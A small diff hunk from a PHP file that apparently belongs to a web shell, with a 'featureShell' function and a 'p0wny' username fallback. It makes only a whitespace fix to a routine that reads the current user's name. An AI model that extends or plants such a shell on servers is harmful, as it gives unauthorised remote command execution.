@@ -78,7 +78,7 @@ function featureShell($cmd, $cwd) {
 }
 
 function featureCurrentUser() {
-    $username= posix_getpwuid(posix_geteuid())['name'];
+    $username = posix_getpwuid(posix_geteuid())['name'];
     if ($username === false) {
         $username = "p0wny";
     }
